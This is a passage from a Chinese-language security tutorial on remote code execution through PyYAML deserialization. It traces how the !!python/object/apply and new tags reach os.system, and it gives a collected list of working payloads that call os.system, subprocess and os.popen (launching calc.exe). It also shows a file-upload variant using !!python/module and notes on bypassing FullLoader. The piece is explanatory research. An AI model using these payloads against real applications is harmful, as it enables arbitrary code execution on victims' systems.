<p>如上图，可以看到这里是将child参数值传入给了node，因此这里的node成了上面的值</p>
<p>所以在下图，我们的node也就是之前的child经过处理，又取得他的value值，也就是calc.exe</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323184747589.png" alt="image-20240323184747589"></p>
<p>这里继续无脑跟进一波</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323185058636.png" alt="image-20240323185058636"></p>
<p>到达make_python_instance函数，跟进到如下图，发现有调用了find_python_name函数，接续跟进~</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323185156973.png" alt="image-20240323185156973"></p>
<p>继续跟进，如下图，这里的suffix的值赋给了name，node的start_mark给了mark</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323185455281.png" alt="image-20240323185455281"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323190158410.png" alt="image-20240323190158410"></p>
<p>继续跟进，发现对name做了针对处理，首先通过rsplit的.符号将name分隔开，然后通过import导入了os模块，随后判断模块是否在sys的模块中（但很显然是在的）</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323190713616.png" alt="image-20240323190713616"></p>
<p>最后通过getattr获取os模块里面的system方法</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323190925079.png" alt="image-20240323190925079"></p>
<p>最后cls的值就是我们的os.system类，最后通过if语句的判断，来决定是通过new来实例化对象还是直接调用类的构造函数来实例化，显然其中的args是calc.exe，且最终是直接调用构造函数来实例化的，至于kwds为空</p>
<p>继续跟进就会发现弹出计算器了，至此分析完毕。</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323191911886.png" alt="image-20240323191911886"></p>
<p>这里的isinstance函数是来判断cls是否为类对象，但我们最后的cls是os.system是一个函数，显然肯定不会进入if语句，由此可以知道为何apply与new标签的处理方法一致</p>
<h4 id="调试分析2">调试分析2</h4>
<p>这里可以分析剩下的三个标签了，如果你执行会发现没办法进行RCE，我们跟进看看为何</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml

payload <span class="token operator">=</span> <span class="token string">'!!python/object:os.system ["calc.exe"]'</span>
yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> Loader<span class="token operator">=</span>yaml<span class="token punctuation">.</span>Loader<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>针对上面代码，我们继续调试跟进到下方，进入make_python函数看看</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323192750492.png" alt="image-20240323192750492"></p>
<p>进入该函数之前我认为可以与上述的apply、new标签对比一下就知道不同之处了，上述两个成功的标签对了一个对args参数的处理</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323193432525.png" alt="image-20240323193432525"></p>
<p>如上图所示，这最终会导致args被赋值为calc.exe，但对于name、module标签来说，他们没有对args参数的处理，如果我们跟进会发现如下图的情况，会发现args被默认赋值为了none，导致最终的system没有参数传入，也就无法RCE</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323193545793.png" alt="image-20240323193545793"></p>
<p>剩下的两个name与object标签都是这样的情况，不再赘述了</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323193704301.png" alt="image-20240323193704301"></p>
<p>至此全部分析完毕，最终能导致RCE的标签就只有apply、new标签，这里给几个常见payload</p>
<h3 id="payload总结">payload总结</h3>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">poc = <span class="token string">'!!python/object/new:os.system ["calc.exe"]'</span>
#给出一些相同用法的POC
#poc = <span class="token string">'!!python/object/new:subprocess.check_output [["calc.exe"]]'</span> 
#poc = <span class="token string">'!!python/object/new:os.popen ["calc.exe"]'</span>
#poc = <span class="token string">'!!python/object/new:subprocess.run ["calc.exe"]'</span>
#poc = <span class="token string">'!!python/object/new:subprocess.call ["calc.exe"]'</span>
#poc = <span class="token string">'!!python/object/new:subprocess.Popen ["calc.exe"]'</span>
#poc = <span class="token string">""</span>"!!python/object/<span class="token property">new</span><span class="token punctuation">:</span>os.system
          <span class="token operator">-</span> calc.exe<span class="token string">""</span>"
#poc = <span class="token string">""</span>"
!!python/object/<span class="token property">new</span><span class="token punctuation">:</span>os.system
  <span class="token property">args</span><span class="token punctuation">:</span> [<span class="token string">"calc.exe"</span>]<span class="token string">""</span>"
<span class="token comment">//这里将new与apply字符替换即可使用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="漏洞成因–文件上传">漏洞成因–文件上传</h2>
<h3 id="python-module标签-2">!!python/module标签</h3>
<p>原理：利用现有文件上传或者写文件的功能，传入一个写入命令执行代码的文件；将文件名写入标签中，当该标签被反序列化时，就可以顺利导入该文件作为模块，执行当中的命令</p>
<p>文件名yaml_test.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'calc.exe'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>如果在另一文件simple.py中，依次运行以下load代码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml

yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"!!python/module:yaml_test"</span><span class="token punctuation">)</span>
<span class="token comment">#exp方法是随意写的，是不存在的，但必须要有，因为这是命名规则，不然会报错，主要是文件名yaml_test要写对</span>
yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"!!python/object:yaml_test.exp"</span> <span class="token punctuation">)</span>
yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"!!python/name:yaml_test.exp"</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>都能成功弹出计算器</p>
<p>当然<code>!!python/object/new</code>和<code>!!python/object/apply</code>也可以用这种方式实现利用</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">'!!python/object/apply:yaml_test.exp {}'</span> <span class="token punctuation">)</span>
yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">'!!python/object/new:yaml_test.exp {}'</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323195256661.png" alt="image-20240323195256661"></p>
<p>如果我们调试分析就知道最终的name会被赋值为yaml_text，而被import导入，导入之后，其中的代码也会被执行，进而弹出计算器</p>
<p>以上要求是在同一目录下，如果不在同一目录下怎么办，好比如这种情况</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css">├── simple.py
└── uploads
    └── yaml_test.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>那payload稍作修改，在文件名前加入目录名可</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#经过测试只有modle标签可行</span>
yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"!!python/module:uploads.yaml_test"</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323200529942.png" alt="image-20240323200529942"></p>
<p>这里只要调试一下就知道问题出在哪里，在module与name的标签处理中</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323200802243.png" alt="image-20240323200802243"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323200939494.png" alt="image-20240323200939494"></p>
<p>对于find_python对应函数的处理中，module标签没有经过rsplit函数的处理，而name经过了</p>
<p>当然文件名写成<code>__init__.py</code>将会更简单，payload只需目录即可，而且apply和new两个标签也可以构造利用了</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">yaml.<span class="token function">load</span><span class="token punctuation">(</span><span class="token string">"!!python/module:uploads"</span> <span class="token punctuation">)</span>
#exp表示着类实例，可以写成其他，虽不存在但是一定要有，否则报错
yaml.<span class="token function">load</span><span class="token punctuation">(</span><span class="token selector">'!!python/object/apply:uploads.exp </span><span class="token punctuation">{</span><span class="token punctuation">}</span>' <span class="token punctuation">)</span>
yaml.<span class="token function">load</span><span class="token punctuation">(</span><span class="token selector">'!!python/object/new:uploads.exp </span><span class="token punctuation">{</span><span class="token punctuation">}</span>' <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="漏洞修复">漏洞修复</h2>
<p>大于5.1的版本，打了补丁（这里懒得找了，就直接cv文章）</p>
<p>通过调试发现，find_python_name方法（还有find_python_mdule方法也一样）增加了一个默认unsafe为false的值</p>
<p>就无法直接<code>__import__</code>，最终会报错</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">find_python_name</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> mark<span class="token punctuation">,</span> unsafe<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> name<span class="token punctuation">:</span>
            <span class="token keyword">raise</span> ConstructorError<span class="token punctuation">(</span><span class="token string">"while constructing a Python object"</span><span class="token punctuation">,</span> mark<span class="token punctuation">,</span>
                    <span class="token string">"expected non-empty name appended to the tag"</span><span class="token punctuation">,</span> mark<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">u'.'</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>
            module_name<span class="token punctuation">,</span> object_name <span class="token operator">=</span> name<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            module_name <span class="token operator">=</span> <span class="token string">'__builtin__'</span>
            object_name <span class="token operator">=</span> name
        <span class="token keyword">if</span> unsafe<span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token builtin">__import__</span><span class="token punctuation">(</span>module_name<span class="token punctuation">)</span>
            <span class="token keyword">except</span> ImportError<span class="token punctuation">,</span> exc<span class="token punctuation">:</span>
                <span class="token keyword">raise</span> ConstructorError<span class="token punctuation">(</span><span class="token string">"while constructing a Python object"</span><span class="token punctuation">,</span> mark<span class="token punctuation">,</span>
                        <span class="token string">"cannot find module %r (%s)"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module_name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> exc<span class="token punctuation">)</span><span class="token punctuation">,</span> mark<span class="token punctuation">)</span>
        <span class="token operator">//</span>这里查看是不是在sys<span class="token punctuation">.</span>moudles字典里，不是就会进入直接报错
        <span class="token keyword">if</span> module_name <span class="token keyword">not</span> <span class="token keyword">in</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">:</span>
            <span class="token keyword">raise</span> ConstructorError<span class="token punctuation">(</span><span class="token string">"while constructing a Python object"</span><span class="token punctuation">,</span> mark<span class="token punctuation">,</span>
                    <span class="token string">"module %r is not imported"</span> <span class="token operator">%</span> module_name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mark<span class="token punctuation">)</span>
        module <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span>module_name<span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>module<span class="token punctuation">,</span> object_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> ConstructorError<span class="token punctuation">(</span><span class="token string">"while constructing a Python object"</span><span class="token punctuation">,</span> mark<span class="token punctuation">,</span>
                    <span class="token string">"cannot find %r in the module %r"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>object_name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                        module<span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span> mark<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>module<span class="token punctuation">,</span> object_name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>接下来执行这一段</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>unsafe <span class="token keyword">or</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>cls<span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>classobj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
          <span class="token keyword">raise</span> ConstructorError<span class="token punctuation">(</span><span class="token string">"while constructing a Python instance"</span><span class="token punctuation">,</span> node<span class="token punctuation">.</span>start_mark<span class="token punctuation">,</span>
                  <span class="token string">"expected a class, but found %r"</span> <span class="token operator">%</span> <span class="token builtin">type</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">,</span>
                  node<span class="token punctuation">.</span>start_mark<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="PyYaml-5-1-2">PyYaml&gt;5.1</h2>
<p>在Python的PyYaml库中提供以下方法将python和yaml进行语言格式转换：</p>
<p><strong>load()</strong></p>
<p>在PyYaml&gt;5.1的版本之后，如果要使用load()函数，要跟上一个Loader的参数，否则会报错。(不影响正常输出)</p>
<p>tips：真尴尬，感情我上面分析了半天，用的都是&gt;5.1的版本。。。。但竟然能复现成？？</p>
<p>这里其实和PyYaml&lt;=5.1版本一样，就不多赘述。</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token function">load</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> Loader=yaml.Loader<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这里说明一下PyYaml&gt;5.1都有哪些加载器</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">BaseLoader：不支持强制类型转换
SafeLoader：安全地加载 YAML 格式的数据，限制被加载的 YAML 数据中可用的 Python 对象类型，从而防止执行危险的操作或代码。
FullLoader：加载包含任意 Python 对象的 YAML 数据，FullLoader 加载器不会限制被加载的 YAML 数据中可用的 Python 对象类型，因此可以加载包含任意 Python 对象的 YAML 数据。
UnsafeLoader：加载包含任意 Python 对象的 YAML 数据，并且不会对被加载的 YAML 数据中可用的 Python 对象类型进行任何限制。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>以SafeLoader为例，示例代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml

<span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
        self<span class="token punctuation">.</span>age <span class="token operator">=</span> age

<span class="token keyword">def</span> <span class="token function">person_constructor</span><span class="token punctuation">(</span>loader<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span>
    fields <span class="token operator">=</span> loader<span class="token punctuation">.</span>construct_mapping<span class="token punctuation">(</span>node<span class="token punctuation">,</span> deep<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> Person<span class="token punctuation">(</span><span class="token operator">**</span>fields<span class="token punctuation">)</span>

yaml_data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
- !!python/object:__main__.Person
  name: Alice
  age: 25
- !!python/object:__main__.Person
  name: Bob
  age: 30
"""</span>

yaml<span class="token punctuation">.</span>SafeLoader<span class="token punctuation">.</span>add_constructor<span class="token punctuation">(</span><span class="token string">'tag:yaml.org,2002:python/object:__main__.Person'</span><span class="token punctuation">,</span> person_constructor<span class="token punctuation">)</span>

data <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>yaml_data<span class="token punctuation">,</span> Loader<span class="token operator">=</span>yaml<span class="token punctuation">.</span>SafeLoader<span class="token punctuation">)</span>

<span class="token keyword">for</span> person <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>name<span class="token punctuation">,</span> person<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>load_all(data, Loader=yaml.Loader)</strong></p>
<p>以SafeLoader加载器为例，示例代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml

<span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
        self<span class="token punctuation">.</span>age <span class="token operator">=</span> age

<span class="token keyword">def</span> <span class="token function">person_constructor</span><span class="token punctuation">(</span>loader<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span>
    fields <span class="token operator">=</span> loader<span class="token punctuation">.</span>construct_mapping<span class="token punctuation">(</span>node<span class="token punctuation">,</span> deep<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> Person<span class="token punctuation">(</span><span class="token operator">**</span>fields<span class="token punctuation">)</span>

yaml_data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
# 第一个文档
- !!python/object:__main__.Person
  name: Alice
  age: 25

# 第二个文档
- !!python/object:__main__.Person
  name: Bob
  age: 30
"""</span>

yaml<span class="token punctuation">.</span>SafeLoader<span class="token punctuation">.</span>add_constructor<span class="token punctuation">(</span><span class="token string">'tag:yaml.org,2002:python/object:__main__.Person'</span><span class="token punctuation">,</span> person_constructor<span class="token punctuation">)</span>

data <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load_all<span class="token punctuation">(</span>yaml_data<span class="token punctuation">,</span> Loader<span class="token operator">=</span>yaml<span class="token punctuation">.</span>SafeLoader<span class="token punctuation">)</span>

<span class="token keyword">for</span> doc <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    <span class="token keyword">for</span> person <span class="token keyword">in</span> doc<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span>name<span class="token punctuation">,</span> person<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">Alice 25
Bob 30<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这里其实和load(data, Loader=yaml.Loader)函数一样，就不多赘述了。</p>
<p><strong>full_load(data)</strong></p>
<p>load()与full_load()函数的区别是，full_load()使用<strong>SafeLoader</strong>作为默认解析器。所以说，这是一个相对安全的解析器，它限制了可以执行的Python代码的类型。</p>
<p>示例代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml

yaml_data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
- foo
- bar
- baz
"""</span>

data <span class="token operator">=</span> yaml<span class="token punctuation">.</span>full_load<span class="token punctuation">(</span>yaml_data<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">[<span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'baz'</span>]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>full_load_all(data)</strong></p>
<p>full_load_all()与full_load()函数类似，但可以处理包含多个YAML文档的数据流。</p>
<p>示例代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml

yaml_data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
- foo
- bar
- baz
---
- alice
- bob
- charlie
"""</span>

data <span class="token operator">=</span> yaml<span class="token punctuation">.</span>full_load_all<span class="token punctuation">(</span>yaml_data<span class="token punctuation">)</span>

<span class="token keyword">for</span> doc <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>doc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">[<span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'baz'</span>]
[<span class="token string">'alice'</span><span class="token punctuation">,</span> <span class="token string">'bob'</span><span class="token punctuation">,</span> <span class="token string">'charlie'</span>]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>unsafe_load(data)</strong></p>
<p>unsafe_load()函数可以加载包含自定义Python对象的YAML数据，允许加载和执行任意Python代码，并尝试将它们反序列化为实际的Python对象（存在安全隐患）</p>
<p>示例代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml

yaml_data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
!!python/object:__main__.Person
name: Alice
age: 25
"""</span>

<span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
        self<span class="token punctuation">.</span>age <span class="token operator">=</span> age

data <span class="token operator">=</span> yaml<span class="token punctuation">.</span>unsafe_load<span class="token punctuation">(</span>yaml_data<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">&lt;__main__.Person object at 0x0000022DA0D36CD0&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>unsafe_load_all(data)</strong></p>
<p>相比unsafe_load()，unsafe_load_all()用于将多个YAML文档加载为Python对象的生成器。</p>
<p>示例代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> yaml

yaml_data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
- foo
- bar
- baz
---
- !!python/object:__main__.Person
  name: Alice
  age: 25
"""</span>

<span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
        self<span class="token punctuation">.</span>age <span class="token operator">=</span> age

data <span class="token operator">=</span> yaml<span class="token punctuation">.</span>unsafe_load_all<span class="token punctuation">(</span>yaml_data<span class="token punctuation">)</span>

<span class="token keyword">for</span> doc <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>doc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">[<span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token string">'baz'</span>]
[&lt;__main__.Person object at 0x00000174FFEBD210&gt;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="漏洞成因">漏洞成因</h3>
<p>这里的漏洞成因和PyYaml&lt;=5.1一样，都是constructor.py中的一些不严谨的代码引起的漏洞。</p>
<h3 id="漏洞利用">漏洞利用</h3>
<p>我这里选用测试的PyYaml版本是5.1.1版本。</p>
<p>在PyYaml&gt;5.1的版本之后，Fullloader这个加载器对于payload的限制比较多了，我们延用PyYaml的poc还是可以的，只不过要修改一下。</p>
<p>我们还可以利用python内置的builtins模块(因为之前我们审计constructor.py时，发现定义的find_python_name()中，如果不用"."将模块名和对象名分开，会默认调用builtins模块)</p>
<h3 id="PyYaml-5-1的poc">PyYaml&lt;=5.1的poc</h3>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">from yaml import <span class="token operator">*</span>
poc= b<span class="token string">""</span>"!!python/object/<span class="token property">apply</span><span class="token punctuation">:</span>os.system
<span class="token operator">-</span> calc<span class="token string">""</span>"
#subprocess.check_output
#os.popen
#subprocess.run
#subprocess.call
#subprocess.Popen

yaml.<span class="token function">load</span><span class="token punctuation">(</span>poc<span class="token punctuation">,</span>Loader=Loader<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="builtins模块中的内置函数">builtins模块中的内置函数</h3>
<p><code>builtins</code>是python的内建模块，所谓内建模块就是你在使用时不需要<code>import</code>，在python启动后，在没有执行程序员编写的任何代码前，python会加载内建模块中的函数到内存中。</p>
<p>发现在<code>find_python_name</code>处理不带<code>.</code>，也就是module为空的情况下，自动默认module为<code>builtins</code>，并且该模块是在<code>sys.modules</code>中的</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323205827050.png" alt="image-20240323205827050"></p>
<p>首先，我们先明确builtins中的所有的类，从而筛选出可以利用的类</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> builtins

builtin_classes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> obj_name <span class="token keyword">in</span> <span class="token builtin">dir</span><span class="token punctuation">(</span>builtins<span class="token punctuation">)</span><span class="token punctuation">:</span>
    obj <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>builtins<span class="token punctuation">,</span> obj_name<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        builtin_classes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>obj<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>builtin_classes<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
